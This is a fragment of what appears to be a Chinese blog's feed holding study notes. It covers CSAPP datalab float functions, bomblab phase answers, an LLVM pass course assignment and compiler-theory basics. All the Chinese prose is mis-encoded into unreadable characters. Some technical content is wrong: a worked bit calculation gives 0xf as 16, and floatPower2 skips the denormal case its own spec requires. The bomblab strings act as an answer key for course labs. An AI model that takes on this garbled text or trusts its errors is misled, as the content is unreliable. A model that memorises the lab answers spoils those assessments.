ä¸Šåç§»é‡<code>127(32ä½)æˆ–è€…1023(64ä½)</code>ï¼Œ32ä½ä¸‹ï¼Œexp = (6+127)çš„äºŒè¿›åˆ¶è¡¨ç¤º<code>10000101</code></p><p>Frac = å°æ•°ç‚¹åçš„æ•°ï¼Œå¦‚<code>111101001</code></p></blockquote><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="hljs-comment"> *   for floating point argument f.</span><br><span class="hljs-comment"> *   Argument is passed as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point value.</span><br><span class="hljs-comment"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="hljs-comment"> *   0x80000000u.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> exp_const = <span class="hljs-number">0x7f800000</span>; <span class="hljs-comment">// 01111111100000000000000000000000</span><br>    <span class="hljs-keyword">int</span> frac_const = <span class="hljs-number">0x7fffff</span>;  <span class="hljs-comment">// 00000000011111111111111111111111</span><br>    <span class="hljs-keyword">int</span> exp = (uf &amp; exp_const)&gt;&gt;<span class="hljs-number">23</span>; <span class="hljs-comment">// get exp part</span><br>    <span class="hljs-keyword">int</span> frac = uf &amp; frac_const;     <span class="hljs-comment">// get frac part</span><br>    frac = frac | <span class="hljs-number">0x800000</span>;         <span class="hljs-comment">// æµ®ç‚¹æ•°çœç•¥äº†ç¬¬ä¸€ä¸ª1ï¼Œä¸€èˆ¬åˆ°ä½ç§»çš„æ—¶å€™ï¼Œ1.fracï¼Œå°æ•°ç‚¹å‰çš„1è¢«çœç•¥äº†ï¼Œæ‰€ä»¥å¾—è¡¥ä¸Š</span><br>    <span class="hljs-keyword">int</span> sign = uf &gt;&gt; <span class="hljs-number">31</span>;            <span class="hljs-comment">// get sign</span><br>    <span class="hljs-keyword">int</span> sign_bit = sign &lt;&lt; <span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">int</span> shift_num = exp - <span class="hljs-number">127</span>;<br><br>    <span class="hljs-keyword">if</span> (shift_num &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (shift_num &gt; <span class="hljs-number">31</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000000</span>u;<br><br>    <span class="hljs-keyword">if</span> (shift_num &gt; <span class="hljs-number">23</span>)<span class="hljs-comment">// å¦‚æœä½ç§»åœ¨23ä»¥ä¸Šï¼Œè¯´æ˜fracéƒ¨åˆ†å…¨éƒ½æ˜¯å°æ•°ç‚¹å‰çš„ï¼Œéœ€è¦å·¦ç§»</span><br>        frac = frac &lt;&lt; (shift_num - <span class="hljs-number">23</span>);<br>    <span class="hljs-keyword">else</span><span class="hljs-comment">// å³ç§»å¹¶å°†å°æ•°ç‚¹åçš„çœç•¥æ‰</span><br>        frac = (frac &gt;&gt; (<span class="hljs-number">23</span> - shift_num));<br><br>    <span class="hljs-keyword">if</span> (sign)<br>        <span class="hljs-keyword">return</span> ~frac+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> frac;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="hljs-comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The unsigned value that is returned should have the identical bit</span><br><span class="hljs-comment"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="hljs-comment"> *   If the result is too small to be represented as a denorm, return</span><br><span class="hljs-comment"> *   0. If too large, return +INF.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span><br><span class="hljs-comment"> *   Max ops: 30 </span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">floatPower2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> INF = <span class="hljs-number">0x7f800000</span>; <span class="hljs-comment">// 01111111100000000000000000000000</span><br>    <span class="hljs-keyword">int</span> exp = x + <span class="hljs-number">127</span>;<br>    <span class="hljs-keyword">if</span> (exp &gt; <span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">return</span> INF;<br>    <span class="hljs-keyword">if</span> (exp &gt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> exp &lt;&lt; <span class="hljs-number">23</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>2.0çš„ä½çº§è¡¨ç¤ºï¼ˆ 1.0 * 2^1 ï¼‰ï¼šç¬¦å·ä½ï¼š0ï¼ŒæŒ‡æ•°ï¼š1+127=128ï¼Œfrac=1.0-1=0ã€‚</p><p>é¦–å…ˆå¾—åˆ°åç§»ä¹‹åçš„æŒ‡æ•°å€¼eï¼Œå¦‚æœeå°äºç­‰äº0ï¼ˆä¸º0æ—¶ï¼Œç»“æœä¸º0ï¼Œå› ä¸º2.0çš„æµ®ç‚¹è¡¨ç¤ºfracéƒ¨åˆ†ä¸º0ï¼‰ï¼Œå¯¹åº”çš„å¦‚æœeå¤§äºç­‰äº255åˆ™ä¸ºæ— ç©·å¤§æˆ–è¶Šç•Œäº†ã€‚å¦åˆ™è¿”å›æ­£å¸¸æµ®ç‚¹å€¼ï¼Œfracä¸º0ï¼Œç›´æ¥å¯¹åº”æŒ‡æ•°å³å¯</p><p>æ¥æº<a href="https://zhuanlan.zhihu.com/p/59534845">https://zhuanlan.zhihu.com/p/59534845</a></p></blockquote><h2 id="bomblab"><a href="#bomblab" class="headerlink" title="bomblab"></a>bomblab</h2><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h3><p><code>Border relations with Canada have never been better.</code></p><h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h3><p>çœ‹phase_2å‡½æ•°é‡Œ</p><img src="/2020/08/22/CSAPP_lab/image-20200905200221312.png" class="" title="image-20200905200221312"><img src="/2020/08/22/CSAPP_lab/image-20200905201155428.png" class="" title="image-20200905201155428"><p>è¯»å–äº†å…­ä¸ªæ•°å­—ï¼Œç»“åˆf5ç”Ÿæˆçš„ä¼ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°è®²è¯»å–çš„æ•°æ®å­˜å…¥åˆ°æ ˆç§ã€‚è°ƒç”¨ç»“æŸåä¼šå°†[rsp]ä¸1è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªæ•°å¿…é¡»æ˜¯1ã€‚</p><img src="/2020/08/22/CSAPP_lab/image-20200905202536189.png" class="" title="image-20200905202536189"><p>æ ‡é»„çš„åœ°æ–¹ï¼Œå°†[rsp+4]æ”¾åˆ°rbxä¸­ï¼Œç„¶ååœ¨0x400F17è¿™é‡Œï¼Œå¯ä»¥çœ‹åˆ°å°†[rbx-4]ï¼Œä¹Ÿå°±æ˜¯[rsp]æ”¾å…¥eaxä¸­ï¼Œå†eaxè‡ªåŠ ï¼Œéšåå°†exaå’Œ[rbx]ç›¸æ¯”è¾ƒï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯è¯»å–çš„æ•°å­—ä¸­ï¼Œç¬¬äºŒä¸ªæ•°å­—æ˜¯ç¬¬ä¸€ä¸ªæ•°å­—*2ï¼Œä»¥æ­¤ç±»æ¨ï¼Œä¸€ç›´åˆ°rbx = rbp ä¹Ÿå°±æ˜¯ç›´åˆ°rsp + 18hï¼Œä¹Ÿå°±æ˜¯æ¯”å¯¹å®Œè¿™è¯»å–çš„å…­ä¸ªæ•°å­—ï¼Œç„¶åå†ç»“æŸå¾ªç¯è§£é™¤ç‚¸å¼¹ã€‚</p><h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h3><p>æ ¹æ®è¾“å…¥çš„v8ï¼Œæ¯”å¯¹resultæ˜¯å¦å’Œv9ä¸€æ ·</p><h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h3><p>å¯ä»¥ç”¨pythonå†™ä¸€ä¸‹func4çš„ä»£ç ï¼Œæˆ–è€…ç›´æ¥è®©v8=7è®©è¿”å›ç»“æœæ˜¯0å°±è¡Œ</p><h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h3><img src="/2020/08/22/CSAPP_lab/image-20200906215307237.png" class="" title="image-20200906215307237"><img src="/2020/08/22/CSAPP_lab/image-20200906215354052.png" class="" title="image-20200906215354052"><p>èµ‹å€¼è¿™é‡Œï¼Œç”±äºä¼šå’Œ 0xFä¸ä¸€ä¸‹ï¼Œæ‰€ä»¥ä¸ºäº†ä½¿ç»“æœæ˜¯flyersï¼Œè¾“å…¥<code>9on567</code>å³å¯åœ¨è¿™ä¸ªæ•°ç»„ä¸­å–å¾—å¯¹åº”çš„å­—å¹•</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">o</span> = <span class="hljs-number">0110</span> <span class="hljs-number">1111</span> <br><span class="hljs-attribute">o</span> &amp; <span class="hljs-number">0</span>xf = <span class="hljs-number">0000</span> <span class="hljs-number">1111</span> = <span class="hljs-number">16</span> = <span class="hljs-number">0</span>xf<br><span class="hljs-attribute">n</span> = <span class="hljs-number">0110</span> <span class="hljs-number">1110</span><br><span class="hljs-attribute">n</span> &amp; <span class="hljs-number">0</span>xf = <span class="hljs-number">0000</span> <span class="hljs-number">1110</span> = <span class="hljs-number">15</span> = <span class="hljs-number">0</span>xe<br></code></pre></td></tr></table></figure><h3 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase_6"></a>Phase_6</h3><p>4 3 2 1 6 5</p><p>æŒ–å‘ï¼Œå’•å’•å’•</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>LLVM pass</title>
    <link href="/2020/08/21/LLVM%20pass/"/>
    <url>/2020/08/21/LLVM%20pass/</url>
    
    <content type="html"><![CDATA[<p>å¯ä»¥å…ˆçœ‹çœ‹ <a href="https://zhuanlan.zhihu.com/p/122522485">è¿™é‡Œ</a></p><p>LLVMçš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªåº“ã€‚ä»CSCD70çš„Assignment1æ¥çœ‹ï¼Œllvm passå¯ä»¥è°ƒç”¨åº“æ¥è¾“å‡ºæºä»£ç loop.cé‡Œæœ‰çš„å‡½æ•°åç§°ï¼Œç›´æ¥è°ƒç”¨è¯¥å‡½æ•°çš„æ¬¡æ•°ï¼Œå‚æ•°ä¸ªæ•°ï¼ŒBasic Blocksæ•°é‡å’ŒæŒ‡ä»¤ä¸ªæ•°(FunctionInfo.cppé‡Œå®Œæˆ)å’Œå¯¹ä»£ç è¿›è¡Œä¼˜åŒ–ä½¿å…¶è¿è¡Œæ›´å¿«(LocalOpt.cppé‡Œå®Œæˆ)ï¼Œä¼˜åŒ–æŒ‡åŠ å‡ä¹˜é™¤ä¼˜åŒ–ï¼Œå¦‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">x</span> + <span class="hljs-number">0</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> + <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-keyword">x</span><br><span class="hljs-number">2</span> * <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> * <span class="hljs-number">2</span> <span class="hljs-operator">=</span>&gt; (<span class="hljs-keyword">x</span> + <span class="hljs-keyword">x</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">x</span> &lt;&lt; <span class="hljs-number">1</span><br>a <span class="hljs-operator">=</span> b + <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> a - <span class="hljs-number">1</span> <span class="hljs-operator">=</span>&gt; a <span class="hljs-operator">=</span> b + <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> b<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‚è€ƒyoun9å¸ˆå‚…çš„<a href="https://github.com/y-f00l/f00l_llvm_learn">github</a>ï¼Œé‡Œé¢æœ‰ä»–çš„ä¸€äº›å¾ˆå¥½çš„ç¬”è®°ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–è¯‘åŸç†å­¦ä¹ ç¬”è®°</title>
    <link href="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1cE411f78c?p=1">è§†é¢‘</a></p><h2 id="ç¼–è¯‘å™¨ç»“æ„"><a href="#ç¼–è¯‘å™¨ç»“æ„" class="headerlink" title="ç¼–è¯‘å™¨ç»“æ„"></a>ç¼–è¯‘å™¨ç»“æ„</h2><h3 id="è¯æ³•åˆ†æ-Lexical-analysis-or-scanning"><a href="#è¯æ³•åˆ†æ-Lexical-analysis-or-scanning" class="headerlink" title="è¯æ³•åˆ†æ Lexical analysis or scanning"></a>è¯æ³•åˆ†æ Lexical analysis or scanning</h3><p><strong>æ£€æµ‹è¾“å…¥å­—ç¬¦ä¸²ä¸­ä¸å±äºæˆ‘ä»¬è¯­è¨€çš„é‚£éƒ¨åˆ†ç¬¦å·</strong></p><p>è¯æ³•åˆ†ææŠŠç¨‹åºå­—æ®µå˜æˆå…³é”®å­—words or è¯æ³•å•å…ƒtokens</p><p>å¦‚</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-keyword">if</span> <span class="hljs-attr">x</span> == y <span class="hljs-keyword">then</span> <span class="hljs-attr">z</span> = <span class="hljs-number">1</span>; <span class="hljs-keyword">else</span> <span class="hljs-attr">z</span> = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>åˆ†å·ï¼Œæ ‡ç‚¹ï¼Œåˆ†éš”ç¬¦éƒ½æ˜¯è¯æ³•å•å…ƒ</p><h3 id="è¯­æ³•åˆ†æsyntax-analysis-parsing"><a href="#è¯­æ³•åˆ†æsyntax-analysis-parsing" class="headerlink" title="è¯­æ³•åˆ†æsyntax analysis parsing"></a>è¯­æ³•åˆ†æsyntax analysis parsing</h3><p>è¯•ç€å»åˆ¤æ–­æ˜¯å¦æ ¼å¼æ­£ç¡®æˆ–è€…æ˜¯å¦æ˜¯æœ‰æ•ˆç¨‹åºï¼ˆè¯­å¥ä¸­æ˜¯å¦å­˜åœ¨æ ¼å¼é”™è¯¯æˆ–æ²¡ç”¨è§£ææ ‘ï¼‰</p><p>if then elseåŒ…å«ä¸‰éƒ¨åˆ†</p><p>predicateæ¡ä»¶åˆ¤æ–­ï¼Œthenè¯­å¥å’Œelseè¯­å¥</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200626235143347.png" class="" title="image-20200626235143347"><h3 id="è¯­ä¹‰åˆ†æ-semantic-analysis"><a href="#è¯­ä¹‰åˆ†æ-semantic-analysis" class="headerlink" title="è¯­ä¹‰åˆ†æ semantic analysis"></a>è¯­ä¹‰åˆ†æ semantic analysis</h3><p>å°è¯•å»æ‰¾å‡ºçŸ›ç›¾çš„åœ°æ–¹ </p><h3 id="ä¼˜åŒ–-optimization"><a href="#ä¼˜åŒ–-optimization" class="headerlink" title="ä¼˜åŒ– optimization"></a>ä¼˜åŒ– optimization</h3><p>ä¿®æ”¹ä»£ç ä½¿ä¹‹ä½¿ç”¨æ›´å°‘çš„èµ„æº</p><h3 id="ä»£ç ç”Ÿæˆ"><a href="#ä»£ç ç”Ÿæˆ" class="headerlink" title="ä»£ç ç”Ÿæˆ"></a>ä»£ç ç”Ÿæˆ</h3><p>é«˜çº§è¯­è¨€è½¬å˜æˆæ±‡ç¼–</p><h2 id="Coolè¯­è¨€"><a href="#Coolè¯­è¨€" class="headerlink" title="Coolè¯­è¨€"></a>Coolè¯­è¨€</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cool">class Main &#123;<br>i : IO &lt;- new IO;<br>main() : Int &#123; &#123; i.out_string(&quot;Hello wordld!\n&quot;); 1;&#125; &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>Int æ˜¯return typeã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">class <span class="hljs-selector-tag">Main</span> &#123;<br><span class="hljs-selector-tag">i</span> : IO &lt;- new IO;<br><span class="hljs-selector-tag">main</span>() : IO &#123; &#123; i.<span class="hljs-built_in">out_string</span>(<span class="hljs-string">&quot;Hello wordld!\n&quot;</span>); &#125; &#125;;<br>&#125;;//ä¸€æ—¦æ‰“å°å®Œstringå°±é€€å‡º<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">class <span class="hljs-selector-tag">Main</span> &#123;<br><span class="hljs-selector-tag">i</span> : IO &lt;- new IO;<br><span class="hljs-selector-tag">main</span>() : Object &#123; &#123; i.<span class="hljs-built_in">out_string</span>(<span class="hljs-string">&quot;Hello wordld!\n&quot;</span>); &#125; &#125;;<br>&#125;;//<span class="hljs-selector-tag">Object</span> è¿”å›ç±»å‹<br><br>class <span class="hljs-selector-tag">Main</span> &#123;<br><span class="hljs-selector-tag">main</span>() : Object &#123; &#123; (new IO).<span class="hljs-built_in">out_string</span>(<span class="hljs-string">&quot;Hello wordld!\n&quot;</span>); &#125; &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ç»§æ‰¿çš„å†™æ³•</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">Main</span> <span class="hljs-selector-tag">inherits</span> <span class="hljs-selector-tag">IO</span>&#123;<br><span class="hljs-selector-tag">main</span>() : <span class="hljs-selector-tag">Object</span> &#123; &#123; <span class="hljs-selector-tag">self</span><span class="hljs-selector-class">.out_string</span>(<span class="hljs-string">&quot;Hello wordld!\n&quot;</span>); &#125; &#125;;<br>&#125;;<br><br><span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">Main</span> <span class="hljs-selector-tag">inherits</span> <span class="hljs-selector-tag">IO</span>&#123;<br><span class="hljs-selector-tag">main</span>() : <span class="hljs-selector-tag">Object</span> &#123; &#123; <span class="hljs-selector-tag">out_string</span>(<span class="hljs-string">&quot;Hello wordld!\n&quot;</span>); &#125; &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="è¯æ³•åˆ†æ"><a href="#è¯æ³•åˆ†æ" class="headerlink" title="è¯æ³•åˆ†æ"></a>è¯æ³•åˆ†æ</h2><p>ç›®æ ‡æ˜¯å°†è¾“å…¥æµåˆ’åˆ†ä¸ºè¯ç´ ã€‚</p><p>ä»å·¦åˆ°å³çš„æ‰«æå­—ç¬¦ä¸²ï¼Œæœ‰æ—¶å¿…é¡»å¯¹è¾“å…¥å­—ç¬¦ä¸²å‘å‰çœ‹ï¼Œæ‰èƒ½å¼„æ¸…æ¥šå½“å‰å­—ç¬¦ä¸²å’Œå­å­—ç¬¦ä¸²åœ¨è¯­è¨€ä¸­çš„è§’è‰²</p><p>å˜é‡åç§°ï¼šå­—æ¯å¼€å¤´</p><p> å­—ç¬¦ä¸²-&gt; è¯­æ³•åˆ†æå™¨ -&gt;<code>å˜æˆtoken&lt;class, string&gt;</code> parserè§£æå™¨</p><p>foo = 42 -&gt;                  &lt;Id, â€œfooâ€&gt; &lt;operator, â€œ=â€&gt; &lt;Int, â€œ42â€&gt;</p><p>æœ‰ä»¥ä¸‹å‡ ç±»ï¼š</p><ul><li>ç©ºæ ¼whitespace</li><li>keyword</li><li>identifiers</li><li>numbers</li></ul><p>è¿™äº›å­å­—ç¬¦ä¸²ç§°ä¸ºè¯ç´ ï¼ˆæ„æˆè¯çš„è¦ç´ ï¼‰ï¼Œ&lt;token classï¼Œ lexemesè¯ç´ &gt;ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªtoken</p><h3 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h3><h4 id="åŸºç¡€è¡¨è¾¾å¼"><a href="#åŸºç¡€è¡¨è¾¾å¼" class="headerlink" title="åŸºç¡€è¡¨è¾¾å¼"></a>åŸºç¡€è¡¨è¾¾å¼</h4><h5 id="å•å­—ç¬¦"><a href="#å•å­—ç¬¦" class="headerlink" title="å•å­—ç¬¦"></a>å•å­—ç¬¦</h5><p>â€˜câ€™ = {â€˜câ€™}</p><h5 id="Epsilon"><a href="#Epsilon" class="headerlink" title="Epsilon"></a>Epsilon</h5><p>Epsilon = {â€œâ€} = å•ä¸ªå­—ç¬¦çš„ç©ºå­—ç¬¦ä¸² != ç©ºå­—ç¬¦ä¸²</p><h4 id="å¤åˆè¡¨è¾¾å¼"><a href="#å¤åˆè¡¨è¾¾å¼" class="headerlink" title="å¤åˆè¡¨è¾¾å¼"></a>å¤åˆè¡¨è¾¾å¼</h4><h5 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h5><p>A + B = {a|aå±äºA} U {b|bå±äºB}</p><p>Aå¹¶B</p><h5 id="Concatencation-çº§è”"><a href="#Concatencation-çº§è”" class="headerlink" title="Concatencation çº§è”"></a>Concatencation çº§è”</h5><p>å¦‚[a,b]ä¸[c,d]çº§è”å¾—åˆ°[ac,ad,bc,bd]</p><p>AB = {ab | aå±äºA ^ b å±äºB }</p><h5 id="Iterator-ä¸²è”"><a href="#Iterator-ä¸²è”" class="headerlink" title="Iterator ä¸²è”"></a>Iterator ä¸²è”</h5><p>A* = 0åˆ°æ— ç©·ä¸ªAä¸²è” </p><h3 id="åŒ¹é…å˜é‡å"><a href="#åŒ¹é…å˜é‡å" class="headerlink" title="åŒ¹é…å˜é‡å"></a>åŒ¹é…å˜é‡å</h3><p>A+ = AA* = è‡³å°‘ä¸€ä¸ªA</p><p>digit = â€˜0â€™ + â€˜1â€™ + â€˜2â€™ + â€˜3â€™ + â€˜4â€™ + â€˜5â€™ + â€˜6â€™ + â€˜7â€™ + â€˜8â€™ + â€˜9â€™</p><p>letter = [a-zA-Z] åŒ¹é…æ‰€æœ‰å­—æ¯</p><p>letter(letter+digit)* å­—æ¯+0æˆ–å¤šä¸ªå­—æ¯å’Œæ•°å­—çš„ç»„åˆ</p><p>ç©ºæ ¼ â€˜ â€˜ + â€˜\nâ€™ + â€˜\tâ€™</p><p>opt_function = (â€˜.â€™digits)?</p><p>Opt_exponent = (â€˜Eâ€™(â€˜+â€™ + â€˜-â€˜)?digits)?</p><p>###è¯æ³•è§„èŒƒ</p><p>å½“è¾“å…¥å€¼æœ‰ä¸¤ç§ä¸åŒçš„å‰ç¼€ï¼Œä¸”è¿™ä¸¤ç§éƒ½æ˜¯æœ‰æ•ˆçš„è¯æ³•å•å…ƒæ—¶ï¼Œå°±åº”è¯¥é€‰æ‹©æœ€é•¿çš„é‚£ä¸ªï¼Œæœ€é•¿åŒ¹é…åŸåˆ™Maximal Munch</p><p>å½“åŒ¹é…åˆ°ä¸¤ä¸ªè§„åˆ™çš„æ—¶å€™ï¼Œå¦‚keiwordï¼Œidentifiersï¼Œä¼šä¼˜å…ˆåŒ¹é…ç¬¬ä¸€ä¸ªchoose the one listed firstã€‚</p><p>æ•è·æœ‰å¯èƒ½é”™è¯¯å­—ç¬¦ä¸²çš„æ­£åˆ™è¡¨è¾¾å¼å¹¶èµ‹äºˆå…¶æœ€ä½ä¼˜å…ˆçº§</p><h3 id="æœ‰é™è‡ªåŠ¨æœºFinite-Automata"><a href="#æœ‰é™è‡ªåŠ¨æœºFinite-Automata" class="headerlink" title="æœ‰é™è‡ªåŠ¨æœºFinite Automata"></a>æœ‰é™è‡ªåŠ¨æœºFinite Automata</h3><h4 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><ul><li>ä¸€ç»„èƒ½è¯»å–çš„è¾“å…¥å­—ç¬¦ä¸²</li><li>ä¸€ä¸ªæœ‰é™çŠ¶æ€çš„é›†åˆ</li><li>ä¸€ä¸ªç‰¹æ®Šçš„é›†åˆè¢«è®¾å®šä¸ºå¼€å§‹çŠ¶æ€</li><li>ä¸€ç»„ç”¨äºæ¥å—çŠ¶æ€çš„é›†åˆï¼ˆè¯»å–å®Œå¯æ¥å—çŠ¶æ€è¾“å…¥åè‡ªåŠ¨ç»“æŸï¼Œå¦åˆ™æ‹’ç»è¾“å…¥</li><li>æœ‰ä¸€äº›ç”¨äºçŠ¶æ€è½¬æ¢çš„é›†åˆ</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628214134850.png" class="" title="image-20200628214134850"><h4 id="Exampls"><a href="#Exampls" class="headerlink" title="Exampls"></a>Exampls</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628160825195.png" class="" title="image-20200628160825195"><h4 id="ç¡®å®šæ€§è‡ªåŠ¨æœºå’Œéç¡®å®šæ€§è‡ªåŠ¨æœºçš„åŒºåˆ«"><a href="#ç¡®å®šæ€§è‡ªåŠ¨æœºå’Œéç¡®å®šæ€§è‡ªåŠ¨æœºçš„åŒºåˆ«" class="headerlink" title="ç¡®å®šæ€§è‡ªåŠ¨æœºå’Œéç¡®å®šæ€§è‡ªåŠ¨æœºçš„åŒºåˆ«"></a>ç¡®å®šæ€§è‡ªåŠ¨æœºå’Œéç¡®å®šæ€§è‡ªåŠ¨æœºçš„åŒºåˆ«</h4><img 